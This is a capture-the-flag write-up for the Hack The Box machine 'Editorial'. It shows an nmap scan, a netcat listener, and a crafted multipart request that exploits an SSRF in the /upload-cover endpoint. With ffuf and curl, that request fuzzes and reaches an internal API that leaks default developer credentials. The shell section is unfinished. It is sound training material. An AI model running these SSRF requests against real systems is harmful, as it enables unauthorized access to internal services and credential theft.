# Editorial

> Reference:
>
> - <https://0xdf.gitlab.io/2024/10/19/htb-editorial.html>

## Port Scanning

```bash
sudo nmap -vv -sC -sV -T4 -A editorial.htb
```

Note that, we may need to add a reference to `/etc/hosts` so that we can access the website.

Results:

```txt
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET
|_http-title: Editorial Tiempo Arriba
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
TCP/IP fingerprint:
OS:SCAN(V=7.97%E=4%D=8/16%OT=22%CT=1%CU=36624%PV=Y%DS=2%DC=T%G=Y%TM=68A0BC6
OS:4%P=arm-apple-darwin24.4.0)SEQ(SP=102%GCD=1%ISR=103%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552
OS:ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)
...
```

## `/upload-cover` API

Try to set up a local server and fill in the cover URL that points to your server. By clicking the `Preview` button, we can find that the server sends a outbound request to our local server

```bash
nc -lnvp 80
python -m http.server 80
```

## Exploit `/upload-cover` API

```bash
echo $'POST /upload-cover HTTP/1.1\r\nHost: editorial.htb\r\nAccept: */*\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryH6FAsTFYvlv4l1kv\r\n\r\n------WebKitFormBoundaryH6FAsTFYvlv4l1kv\r\nContent-Disposition: form-data; name="bookurl"\r\n\r\nhttp://127.0.0.1:FUZZ\r\n------WebKitFormBoundaryH6FAsTFYvlv4l1kv\r\nContent-Disposition: form-data; name="bookfile"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryH6FAsTFYvlv4l1kv--\r\n' > ssrf.request

ffuf -u http://editorial.htb/upload-cover -request ssrf.request -w <( seq 0 65535) -ac
```

Results:

```txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://editorial.htb/upload-cover
 :: Wordlist         : FUZZ: /dev/fd/11
 :: Header           : Accept: */*
 :: Header           : Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryH6FAsTFYvlv4l1kv
 :: Header           : Host: editorial.htb
 :: Data             : ------WebKitFormBoundaryH6FAsTFYvlv4l1kv
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
------WebKitFormBoundaryH6FAsTFYvlv4l1kv
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryH6FAsTFYvlv4l1kv--

 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 104ms]
:: Progress: [65536/65536] :: Job [1/1] :: 250 req/sec :: Duration: [0:04:13] :: Errors: 2 ::
```

Ok, let's try port `5000` and see what it returns.

```bash
curl 'http://editorial.htb/upload-cover' \
  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryH6FAsTFYvlv4l1kv' \
  --data-raw $'------WebKitFormBoundaryH6FAsTFYvlv4l1kv\r\nContent-Disposition: form-data; name="bookurl"\r\n\r\nhttp://127.0.0.1:5000\r\n------WebKitFormBoundaryH6FAsTFYvlv4l1kv\r\nContent-Disposition: form-data; name="bookfile"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryH6FAsTFYvlv4l1kv--\r\n' \
  --insecure

# Try the "uploaded image"
curl http://editorial.htb/static/uploads/bcb45f64-a769-4b1c-961f-47e63ef87955 | jq
```

Response from `http://127.0.0.1:5000`:

```json
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

Using the same trick, we can try to access these API endpoints under Port 5000. Eventually, we find something interesting from `/api/latest/metadata/messages/authors`, which contains the default username and password for `dev` users.

## Shell as `dev`

(TBD)
